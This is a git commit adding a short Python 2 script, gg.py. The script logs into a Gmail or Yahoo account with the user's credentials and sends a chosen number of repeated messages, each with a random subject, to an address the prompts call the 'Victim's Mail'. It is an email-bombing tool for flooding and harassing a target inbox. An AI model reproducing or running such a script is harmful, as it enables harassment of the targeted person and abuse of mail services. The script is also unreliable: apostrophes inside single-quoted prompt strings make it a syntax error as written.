96336eeb3851a8b4668be92eb235825af293b264
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-04-23 22:49:07 +0300

    Create gg.py

---
+++ gg.py
@@ -0,0 +1,48 @@
+import os
+import smtplib
+import getpass
+import sys
+
+
+server = raw_input ('MailServer Gmail : ')
+user = raw_input('My Email : ')
+passwd = getpass.getpass('My Password : ')
+
+
+to = raw_input('\nVictim's Mail : ')
+#subject = raw_input('Subject: ') 
+body = raw_input('Victim's Message: ')
+total = input('How Many Messages : ')
+
+if server == 'gmail':
+    smtp_server = 'smtp.gmail.com'
+    port = 587
+elif server == 'yahoo':
+    smtp_server = 'smtp.mail.yahoo.com'
+    port = 25
+else:
+    print 'Applies only to gmail and yahoo.'
+    sys.exit()
+
+print ''
+
+try:
+    server = smtplib.SMTP(smtp_server,port) 
+    server.ehlo()
+    if smtp_server == "smtp.gmail.com":
+            server.starttls()
+    server.login(user,passwd)
+    for i in range(1, total+1):
+        subject = os.urandom(9)
+        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
+        server.sendmail(user,to,msg)
+        print "\rE-mails sent: %i" % i
+        sys.stdout.flush()
+    server.quit()
+    print '\n Done !!!'
+except KeyboardInterrupt:
+    print '[-] Canceled'
+    sys.exit()
+except smtplib.SMTPAuthenticationError:
+    print '\n[!] The username or password you entered is incorrect.'
+    sys.exit()
